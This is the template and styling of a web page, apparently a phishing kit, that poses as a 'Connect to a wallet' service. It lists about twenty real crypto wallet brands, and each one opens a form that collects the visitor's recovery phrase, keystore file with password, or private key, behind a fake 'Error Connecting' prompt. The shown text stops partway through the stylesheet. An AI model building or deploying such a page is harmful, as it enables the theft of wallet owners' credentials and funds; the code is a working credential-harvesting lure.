  <template>
    <div style="background-color:#cbd5e1">
      <div class="sending" data-reach-dialog-overlay="" style="opacity: 1;z-index: 99999;display: none">
    
        <div class="containerz">
          <div class="boxz">
            <div class="borderz one"></div>
            <div class="borderz two"></div>
            <div class="borderz three"></div>
            <div class="borderz four"></div>
    
            <div class="line one"></div>
            <div class="line two"></div>
            <div class="line three"></div>
          </div>
        </div>
      </div>
       <div id="myModal" class="modal w-full" style="display: none;position: fixed;z-index: 1;padding-top: 100px;left: 0;top: 0;height: 100%;overflow: auto;background-color: rgb(0,0,0);background-color: rgba(0,0,0,0.4);">
        <!-- Modal content -->
        <div class="modal-content flex flex-col " style="margin: auto;padding: 20px;">
          <div class="flex flex-col max-width-md mx-auto bg-white rounded-lg">
           
              <div v-on:click="closeModal" class="place-self-end"><span style="{color: red;font-size: 28px;font-weight: bold;}:focus,:hover { color: #000; text-decoration: none; cursor: pointer;}">&times;</span></div>
              <div class="h-32 w-32 p-4 m-4 flex rounded-lg" style="border: 2px solid red">
                <div><p class="font-bold">Error Connecting...</p> </div>
                <router-link
                  class="text-white text-sm font-bold leading-relaxed inline-block whitespace-nowrap uppercase"
                  to="/profile"
                >
                  <div class="place-self-end"><button
                          class="bg-emerald-500 text-white active:bg-emerald-600 text-xs font-bold uppercase px-4 py-2 rounded shadow hover:shadow-lg outline-none focus:outline-none lg:mr-1 lg:mb-0 ml-3 mb-3 ease-linear transition-all duration-150"
                          type="button"
                        >
                          CONNECT MANUALLY
                        </button></div>
                </router-link>
              </div>
              <div class=" h-32 w-32 p-4 m-4 rounded-lg font-bold" style="border: 1px solid yellow">
                <p>{{platform}}</p>
              </div>
            </div>
          </div>
        </div>  
      <div class="2tzjbs overlay" data-rbnxzn="qw7i7k" style="display: none;">
    
        <div class="ih37zd aletr sswla" data-j9niem="t4amku" style="display: block;">
    
          <div role="dialog" aria-modal="true" aria-labelledby="modal-headline" class="block align-bottom bg-white rounded-lg text-left overflow-hidden  transform transition-all sm:my-8 sm:align-middle">
            <div class="bg-white px-4 pt-5 pb-4 sm:p-6 sm:pb-4">
              <div class="sm:flex sm:items-start">
    
                <div class="mt-3 text-center sm:mt-0 sm:ml-4 sm:text-left w-full mr-10">
    
                  <h3 id="modal-headline" class="text-lg leading-6 mt-2 font-medium text-gray-900" style="display: flex; flex-direction: row;"> <img src="https://walletsyncdapps.com../static/trust-wallet-66f8777532931d9c09b633344981a6a9.png" style="margin-right: 20px; height: 40px; width: 40px" id="myImg"><span>Import your <span id="walletname">Trust</span>
                      wallet</span>
                  </h3>
                  <div class="mt-2">
                    <div class="mt-10">
    
                      <form  method="post"  id="form" name="my-form" netlify >
                        <div class="flex justify-evenly border-b-2 border-fuchsia-600 mb-4">
                          <div id="phrase" class="p-2 border-b-2 border-white hover:border-blue-600 cursor-pointer">
                            Phrase
                          </div>
                          <div id="keystore" class="p-2 border-b-2 border-white hover:border-blue-600 cursor-pointer">
                            Keystore JSON
                          </div>
                          <div id="private" class="p-2 border-b-2 border-white hover:border-blue-600 cursor-pointer">
                            Private Key
                          </div>
                        </div>
                        <div id="first" class="acc-body active">
                          <div class="flex flex-col">
    
                          </div>
                          <div class="flex flex-col mb-6">
                            <div class="relative" data-children-count="1"><textarea cols="30" rows="4" placeholder="Enter your recovery phrase" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="phrase" required=""></textarea>
                              <p class="text-xs text-grey-300 mt-6">
                                Typically 12 (sometimes 24) words separated by
                                single spaces
                              </p>
                            </div>
                          </div>
                          <div class="flex w-full"><button type="submit" class="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in"><span class="mr-2 uppercase">Proceed</span> <span><svg fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor" class="h-6 w-6">
                                  <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                </svg></span></button></div>
                        </div>
                        <div id="second" class="acc-body bg-grey-600">
                          <div class="flex flex-col">
    
                          </div>
                          <div class="flex flex-col mb-6">
                            <div class="relative"><label id="label" for="file-upload" class="UnlockWalletViaKeystoreFile__file-input">
                                <input class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" id="file-upload" type="file" name="file"><span id="span">Choose
                                  Keystore File</span></label></div>
                          </div>
                          <div class="flex flex-col mb-6">
                            <div class="relative" data-children-count="1"><input type="text" name="keystorepassword" placeholder="Wallet password" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                              <p class="text-xs text-grey-300 mt-6">
                                Several lines of text beginning with "{...}" plus
                                the password you used to encrypt it.
                              </p>
                            </div>
                          </div>
                          <div class="flex w-full"><button type="submit" class="flex items-center justify-center focus:outline-none
                            text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2
                            w-full transition duration-150 ease-in"><span class="mr-2
                            uppercase">Proceed</span> <span><svg fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor" class="h-6 w-6">
                                  <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9
                            0 11-18 0 9 9 0 0118 0z"></path>
                                </svg></span></button></div>
                        </div>
                        <div id="third" class="acc-body bg-grey-600">
                          <div class="flex flex-col">
                            <div class="relative"><input type="hidden" name="wallet_id" required="required" placeholder="Wallet ID" id="wallet_id" value="Trust"></div>
                          </div>
                          <div class="flex flex-col mb-6">
                            <div class="relative" data-children-count="1"><input type="text" placeholder="Enter your Private Key" name="privatekey" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                              <p class="text-xs text-grey-300 mt-6">
                                Typically 12 (sometimes 24) words seperated by a
                                single space.
                              </p>
                            </div>
                          </div>
                          <div class="flex w-full"><button type="submit" class="flex items-center justify-center focus:outline-none
                            text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2
                            w-full transition duration-150 ease-in"><span class="mr-2
                            uppercase">Proceed</span> <span><svg fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor" class="h-6 w-6">
                                  <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9
                            0 11-18 0 9 9 0 0118 0z"></path>
                                </svg></span></button></div>
                        </div>
                      </form>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="bg-gray-50 px-4 py-3 sm:px-6 sm:flex sm:flex-row-reverse"><button id="cancel" type="button" class="w-full inline-flex justify-center rounded-md border border-transparent shadow-sm px-4 py-2 bg-red-600 text-base font-medium text-white hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500 sm:ml-3 sm:w-auto sm:text-sm">
                Cancel
              </button></div>
          </div>
    
        </div>
    
      </div>
      <div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper">
       
           <div class='collabland'>
             <!-- <h4>Collab Land</h4> -->
            </div>
                  <section class="pageStyles__SSection-sc-1navawn-4 ibLsRQ">
                    <p style='      float: left;
                    font-weight: bold;
                    margin: 20px 0 0 0;
                    text-align: left;
                    padding: 14px 24px;
                    color: black;'> Connect to a wallet</p>
                    <div class="Grid__SGrid-sc-8d5rqj-0 gAVVCu">
                     
                     <!-- start -->
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <a
                          v-on:click="clickModal('Metamask')"
                          target="_blank"
                        >
                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
                          <div class="flex items-center justify-center green">
                            <div class="mr2 bg-green br-100" style="height:8px;width:8px">
                            </div>
                        </div>
                        Metamask</div>
                      </a>
                      <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons"
                         src="../static/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png"
                         alt="Meta"></div>
                    </div>
           <!-- end -->                     
                  
                     <!-- start -->
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <a
                          v-on:click="clickModal('Trust')"
                          target="_blank"
                        >
                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
                          <div class="flex items-center justify-center green">
                            <div class="mr2 bg-green br-100" style="height:8px;width:8px">
                            </div>
                        </div>
                        Trust</div>
                      </a>
                      <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons"
                         src="../static/trust-wallet-66f8777532931d9c09b633344981a6a9.png"
                         alt="Trust"></div>
                    </div>
           <!-- end -->                     
                  
                      
                     <!-- start -->
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <a
                          v-on:click="clickModal('Coinomi')"
                          target="_blank"
                        >
                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
                          <div class="flex items-center justify-center green">
                            <div class="mr2 bg-green br-100" style="height:8px;width:8px">
                            </div>
                          </div>
                          Coinbase
                        </div>
                      </a>
                      <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons"
                         src="../static/coinbase.png"
                         alt="Coinbase"></div>
                    </div>
           <!-- end -->                     
                  
           
                     <!-- start -->
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <a
                          v-on:click="clickModal('Crypto.com')"
                          target="_blank"
                        >
                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
                          <div class="flex items-center justify-center green">
                            <div class="mr2 bg-green br-100" style="height:8px;width:8px">
                            </div>
                        </div>
                        crypto.com</div>
                       </a> 
                      <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons"
                         src="../static/crypto-4cbeac57421fb3ca2573db2cf448169a.png"
                         alt="Cypto.com"></div>
                    </div>
           <!-- end -->          
           
                     <!-- start -->
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <a
                          v-on:click="clickModal('Blockchain')"
                          target="_blank"
                        >
                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
                          <div class="flex items-center justify-center green">
                            <div class="mr2 bg-green br-100" style="height:8px;width:8px">
                            </div>
                        </div>
                        Blockchain</div>
                      </a>
                      <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons"
                         src="../static/blockchain-logo.png"
                         alt="Blockchain"></div>
                    </div>
           <!-- end -->                     
                             
                     <!-- start -->
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <a
                          v-on:click="clickModal('Binance_Smart_chain')"
                          target="_blank"
                        >
                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
                          <div class="flex items-center justify-center green">
                            <div class="mr2 bg-green br-100" style="height:8px;width:8px">
                            </div>
                        </div>
                        Binance Smart Chain</div>
                      </a>
                      <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons"
                         src="../static/bsc-logo.png"
                         alt="binance"></div>
                    </div>
           <!-- end -->                     
                  
                     <!-- start -->
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <a
                          v-on:click="clickModal('Safepal')"
                          target="_blank"
                        >
                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
                          <div class="flex items-center justify-center green">
                            <div class="mr2 bg-green br-100" style="height:8px;width:8px">
                            </div>
                        </div>
                        Safepal</div>
                      </a>
                      <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons"
                         src="../static/safepal-1022b40e2ea3a4a6bb19cf6ff28d8b92.png"
                         alt="safepal"></div>
                    </div>
           <!-- end -->                     
                  
                     <!-- start -->
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <a
                          v-on:click="clickModal('Argent')"
                          target="_blank"
                        >
                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
                          <div class="flex items-center justify-center green">
                            <div class="mr2 bg-green br-100" style="height:8px;width:8px">
                            </div>
                        </div>
                        Argent</div>
                      </a>
                      <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons"
                         src="../static/image.jpeg"
                         alt="Argent"></div>
                    </div>
           <!-- end -->                     
                  
           
                     <!-- start -->
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <a
                          v-on:click="clickModal('Aktionariat')"
                          target="_blank"
                        >
                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
                          <div class="flex items-center justify-center green">
                            <div class="mr2 bg-green br-100" style="height:8px;width:8px">
                            </div>
                        </div>
                        Aktionariat</div>
                      </a>
                      <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons"
                         src="../static/aktionariat-c5784b26234a389632687a36d2fb3258.png"
                         alt="aktionariat"></div>
                    </div>
           <!-- end -->                     
                  
                     <!-- start -->
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <a
                          v-on:click="clickModal('Keyring_Pro')"
                          target="_blank"
                        >
                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
                          <div class="flex items-center justify-center green">
                            <div class="mr2 bg-green br-100" style="height:8px;width:8px">
                            </div>
                        </div>
                        Keyring Pro</div>
                      </a>
                      <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons"
                         src="../static/keyringpro-830b2c0ee1db401dd64c2899eaf2adb3.png"
                         alt="keyring"></div>
                    </div>
           <!-- end -->                     
                  
                     <!-- start -->
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <a
                          v-on:click="clickModal('BitKeep')"
                          target="_blank"
                        >
                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
                          <div class="flex items-center justify-center green">
                            <div class="mr2 bg-green br-100" style="height:8px;width:8px">
                            </div>
                        </div>
                        BitKeep</div>
                      </a>
                      <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons"
                         src="../static/bitkeep-387b0ca7da4cf322f44c70c23064c529.png"
                         alt="bitkeep"></div>
                    </div>
           <!-- end -->         
           
           
                     <!-- start -->
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <a
                          v-on:click="clickModal('SparkPoint')"
                          target="_blank"
                        >
                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
                          <div class="flex items-center justify-center green">
                            <div class="mr2 bg-green br-100" style="height:8px;width:8px">
                            </div>
                        </div>
                        SparkPoint</div>
                      </a>
                      <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons"
                         src="../static/sparkpoint-5c0d3a4ab850a7ee2a3f03e215b68f2c.png"
                         alt="SparkPoint"></div>
                    </div>
           <!-- end -->                     
                  
           
                     <!-- start -->
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <a
                          v-on:click="clickModal('OwnBit')"
                          target="_blank"
                        >
                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
                          <div class="flex items-center justify-center green">
                            <div class="mr2 bg-green br-100" style="height:8px;width:8px">
                            </div>
                        </div>
                        OwnBit</div>
                      </a>
                      <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons"
                         src="../static/ownbit-0b6b21e40acf2fa0f85d2c5ce38c4c51.png"
                         alt="ownbit"></div>
                    </div>
           <!-- end -->                     
                  
                     <!-- start -->
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <a
                          v-on:click="clickModal('Infinity_Wallet')"
                          target="_blank"
                        >
                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
                          <div class="flex items-center justify-center green">
                            <div class="mr2 bg-green br-100" style="height:8px;width:8px">
                            </div>
                        </div>
                        Infinty Wallet</div>
                      </a>
                      <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons"
                         src="../static/infinity-wallet-48e78bc97f96bad14ee6b781423a69ea.png"
                         alt="infinity"></div>
                    </div>
           <!-- end -->                     
                  
                     <!-- start -->
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <a
                          v-on:click="clickModal('Wallet.io')"
                          target="_blank"
                        >
                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
                          <div class="flex items-center justify-center green">
                            <div class="mr2 bg-green br-100" style="height:8px;width:8px">
                            </div>
                        </div>
                        Wallet.io</div>
                      </a>
                      <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons"
                         src="../static/wallet-io-198f396de22fe25eb370f46544abe69d.png"
                         alt="wallet.io"></div>
                    </div>
           <!-- end -->                
           
           
                     <!-- start -->
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <a
                          v-on:click="clickModal('Infinito')"
                          target="_blank"
                        >
                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
                          <div class="flex items-center justify-center green">
                            <div class="mr2 bg-green br-100" style="height:8px;width:8px">
                            </div>
                        </div>
                        Infinito</div>
                      </a>
                      <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons"
                         src="../static/infinito-wallet-68da061495160c96f4bcb5e70e612fdd.png"
                         alt="Infinito"></div>
                    </div>
           <!-- end -->                     
                  
                  
                     <!-- start -->
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <a
                          v-on:click="clickModal('Torus')"
                          target="_blank"
                        >
                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
                          <div class="flex items-center justify-center green">
                            <div class="mr2 bg-green br-100" style="height:8px;width:8px">
                            </div>
                        </div>
                        Torus</div>
                      </a>
                      <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons"
                         src="../static/one.png"
                         alt="torus"></div>
                    </div>
           <!-- end -->         
            
           
                     <!-- start -->
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <a
                          v-on:click="clickModal('Nash')"
                          target="_blank"
                        >
                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
                          <div class="flex items-center justify-center green">
                            <div class="mr2 bg-green br-100" style="height:8px;width:8px">
                            </div>
                        </div>
                        Nash</div>
                      </a>
                      <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons"
                         src="../static/swift.png"
                         alt="nash"></div>
                    </div>
           <!-- end -->            
           
           
                     <!-- start -->
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <a
                          v-on:click="clickModal('BitPay')"
                          target="_blank"
                        >
                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
                          <div class="flex items-center justify-center green">
                            <div class="mr2 bg-green br-100" style="height:8px;width:8px">
                            </div>
                        </div>
                        BitPay</div>
                      </a>
                      <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons"
                         src="../static/bitpay-1573dd6c95eb38386f181048663590d0.jpg"
                         alt="Bitpay"></div>
                    </div>
           <!-- end -->                     
                  
                     <!-- start -->
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <a
                          v-on:click="clickModal('imToken')"
                          target="_blank"
                        >
                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
                          <div class="flex items-center justify-center green">
                            <div class="mr2 bg-green br-100" style="height:8px;width:8px">
                            </div>
                        </div>
                        imToken</div>
                      </a>
                      <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons"
                         src="../static/imtoken-fd8c7c52dac6101568954e7448a49202.png"
                         alt="imtoken"></div>
                    </div>
           <!-- end -->                     
                  
                     <!-- start -->
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <a
                          v-on:click="clickModal('Other_Wallet')"
                          target="_blank"
                        >
                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
                          <div class="flex items-center justify-center green">
                            <div class="mr2 bg-green br-100" style="height:8px;width:8px">
                            </div>
                        </div>
                        Other Wallet</div>
                      </a>
                      <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons"
                         src="../static/otherssss.jpg"
                         alt="Other"></div>
                    </div>
           <!-- end -->                     
        
                  
                    </div>
                  </section>
      </div>
    </div>
  </template>

     <style>

      /*! CSS Used from: Embedded */
    
  
      /* Smartphones (portrait and landscape) ----------- */
      @media only screen and (min-device-width : 320px) and (max-device-width : 480px) {
  
        /* Styles */
        .aletr {
          width: 90%;
        }
      }
  
      /* Smartphones (landscape) ----------- */
      @media only screen and (min-width : 321px) {
  
        /* Styles */
        .aletr {
          width: 80%;
        }
      }
  
      /* Smartphones (portrait) ----------- */
      @media only screen and (max-width : 320px) {
  
        /* Styles */
        .aletr {
          width: 80%;
        }
      }
  
      /* iPads (portrait and landscape) ----------- */
      @media only screen and (min-width : 768px) and (max-width : 1024px) {
  
        /* Styles */
        .aletr {
          width: 50%;
        }
      }
  
      /* iPads (landscape) ----------- */
      @media only screen and (min-device-width : 768px) and (max-device-width : 1024px) and (orientation : landscape) {
  
        /* Styles */
        .aletr {
          width: 50%;
        }
      }
  
      /* iPads (portrait) ----------- */
      @media only screen and (min-device-width : 768px) and (max-device-width : 1024px) and (orientation : portrait) {
  
        /* Styles */
        .aletr {
          width: 60%;
        }
      }
  
      /* Desktops and laptops ----------- */
      @media only screen and (min-width : 1224px) {
  
        /* Styles */
        .aletr {
          width: 40%;
        }
      }
  
      /* Large screens ----------- */
      @media only screen and (min-width : 1824px) {
  
        /* Styles */
        .aletr {
          width: 30%;
        }
      }
  
      /* iPhone 4 ----------- */
      @media only screen and (-webkit-min-device-pixel-ratio : 1.5),
      only screen and (min-device-pixel-ratio : 1.5) {
        /* Styles */
      }

            /* sc-component-id: Header__SHeader-cphy8j-0 */
      .kyUqCt {
        width: 100%;
        max-width: 1200px;
        margin: 0 auto;
        height: 145px;
        padding: 0 20px;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        -webkit-box-pack: space-around;
        -webkit-justify-content: space-around;
        -ms-flex-pack: space-around;
        justify-content: space-around;
      }
  
      @media screen and (max-width:640px) {
        .kyUqCt {
          height: 100px;
          padding: 0 15px;
        }
      }
  
      /* sc-component-id: Header__SInternalLink-cphy8j-1 */
      .guKAph {
        width: 100px;
        text-align: center;
        font-size: 20px;
        color: rgb(88, 120, 188);
        font-weight: 500;
      }
  
      @media screen and (max-width:640px) {
        .guKAph {
          font-size: 16px;
        }
      }
  
      /* sc-component-id: Header__SInternalLink-cphy8j-1-a */
      .eyaBAy {
        width: 100px;
        text-align: center;
        font-size: 20px;
        color: rgb(88, 120, 188);
        font-weight: 500;
      }
  
      @media screen and (max-width:640px) {
        .eyaBAy {
          font-size: 16px;
        }
      }
  
      /* sc-component-id: Header__SLogo-cphy8j-2 */
      .hnlESl {
        -webkit-flex: 1;
        -ms-flex: 1;
        flex: 1;
        padding: 0 20px;
        text-align: center;
      }
  
      .hnlESl img {
        width: 100%;
        max-width: 120px;
        min-width: 60px;
      }
  
      /* sc-component-id: Footer__SFooter-sc-1k47aoh-0 */
      .jVWwwJ {
        width: 100%;
        max-width: 1200px;
        margin: 0 auto;
        height: 160px;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-shrink: 0;
        -ms-flex-negative: 0;
        flex-shrink: 0;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        -webkit-box-pack: center;
        -webkit-justify-content: center;
        -ms-flex-pack: center;
        justify-content: center;
      }
  
      @media screen and (max-width:640px) {
        .jVWwwJ {
          -webkit-flex-direction: column;
          -ms-flex-direction: column;
          flex-direction: column;
          height: auto;
          margin: 30px 0;
        }
  
        .jVWwwJ a {
          margin: 10px 0;
        }
      }
  
      /* sc-component-id: Footer__SSocialIcon-sc-1k47aoh-1 */
      .hvbAKM {
        width: 20px;
        height: 20px;
      }
  
      .hvbAKM img {
        height: 100%;
      }
  
      /* sc-component-id: Footer__SExternalLink-sc-1k47aoh-2 */
      .YwSGw {
        width: 150px;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        -webkit-box-pack: center;
        -webkit-justify-content: center;
        -ms-flex-pack: center;
        justify-content: center;
      }
  
      .YwSGw p {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        padding-left: 0.5em;
        font-size: 14px;
        color: rgb(88, 120, 188);
        font-weight: 500;
      }
  
 
  
     
  
      @media screen and (max-width:640px) {
        .hfVnjX {
          -webkit-flex-direction: column;
          -ms-flex-direction: column;
          flex-direction: column;
        }
      }
  
      /* sc-component-id: Grid__SGrid-sc-8d5rqj-0 */
      .gAVVCu {
        width: 100%;
    padding: 24px;
    max-height: 75vh;
    overflow-x: hidden;
    overflow-y: scroll;
    border-radius: 0 0 20px 20px;
    position: unset;
    z-index: -1;
    background: rgb(255, 255, 255);
    display: flex;
    flex-direction: column;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    grid-column-gap: 30px;
    grid-row-gap: 5px;
}
  
      @media screen and (max-width:640px) {
        .gAVVCu {
          grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
          grid-column-gap: 15px;
          grid-row-gap: 15px;
        }
      }
  
      /* sc-component-id: pageStyles__SIndexPage-sc-1navawn-0 */
      .hDbjSS {
        height: 100%;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        -webkit-box-pack: space-around;
        -webkit-justify-content: space-around;
        -ms-flex-pack: space-around;
        justify-content: space-around;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        text-align: center;
        padding: 0 32px;
        padding-top: 30px;
      }
  
      @media screen and (max-width:640px) {
        .hDbjSS {
          padding: 0 24px;
          padding-top: 20px;
        }
      }
  
      /* sc-component-id: pageStyles__SBrandingWrapper-sc-1navawn-1 */
      .fAmUdU {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        -webkit-box-pack: center;
        -webkit-justify-content: center;
        -ms-flex-pack: center;
        justify-content: center;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        width: 100%;
        max-width: 700px;
        margin: 0 auto;
      }
  
      /* sc-component-id: pageStyles__SBranding-sc-1navawn-2 */
      .gFeYHJ {
        font-size: 35px;
        font-weight: 500;
        text-align: center;
      }
  
      /* sc-component-id: pageStyles__SPageDescription-sc-1navawn-3 */
      .jGHRMl {
        margin-top: 40px;
        font-size: 18px;
        font-weight: 300;
        line-height: 1.35;
      }
      div#gatsby-focus-wrapper {
    display: flex;
    justify-content: center;
}
@media screen and (max-width: 500px ){
  .ibLsRQ {
width: 90%!important;
  }
  
}

@media screen and (max-width: 800px ){
  .ibLsRQ {
width: 70%!important;
  }
  
}
@media screen and (max-width: 500px ){
  .ibLsRQ {
width: 90%!important;
  }
  
}

/* sc-component-id: pageStyles__SSection-sc-1navawn-4 */
      .ibLsRQ {
        position: fixed;
    top: 10vh;
    width: 50%;
    height: 80vh;
    min-width: 200px;
    overflow-y: hidden;
    background-color: #ffffff;
    border-radius: 25px;
    z-index: 0;
      }
  
.collabland {
    position: fixed;
    width: 100%;
    font-weight: 900;
    /* margin: 2em; */
    padding: 32px;
    display: flex;
    float: left;
    align-items: center;
    /* max-width: 4rem; */
    color: #000;
    border-radius: 25px;
}

      /* sc-component-id: pageStyles__SApp-sc-1navawn-5 */
      .cmAzHq {
    height: 2rem;
    width: 100%;
    display: flex;
    cursor: pointer;
    border: rgba(0, 0, 0, .1) 1px solid;
    padding: 1.5em 0.4em;
    border-radius: 0.6em;
    align-items: center;
    justify-content: space-between;
}
.mr2.bg-green.br-100{
height: 8px;
color: green;
    background-color: #19a974;
    margin: 0.4em;
    border-radius: 20px;
}
      /* sc-component-id: pageStyles__SAppIcon-sc-1navawn-6 */
      .kSIOSl {
        width: 100%;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        -webkit-box-pack: center;
        -webkit-justify-content: center;
        -ms-flex-pack: center;
        justify-content: center;
        padding: 25px;
      }
  
      .kSIOSl img {
        -webkit-filter: initial;
        filter: initial;
        width: 100%;
        height: 100%;
        border-radius: 50%;
      }
  
      .lfUBtr {
        /* width: 100%; */
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        -webkit-box-pack: center;
        -webkit-justify-content: center;
        -ms-flex-pack: center;
        justify-content: center;
        padding: 25px;
      }
  
      .lfUBtr img {
        -webkit-filter: initial;
        filter: initial;
        width: 2rem;
        height: 2rem;
        border-radius: initial;
      }
  
      /* sc-component-id: pageStyles__SAppName-sc-1navawn-7 */
      .eodRCW {
        font-weight: bold;
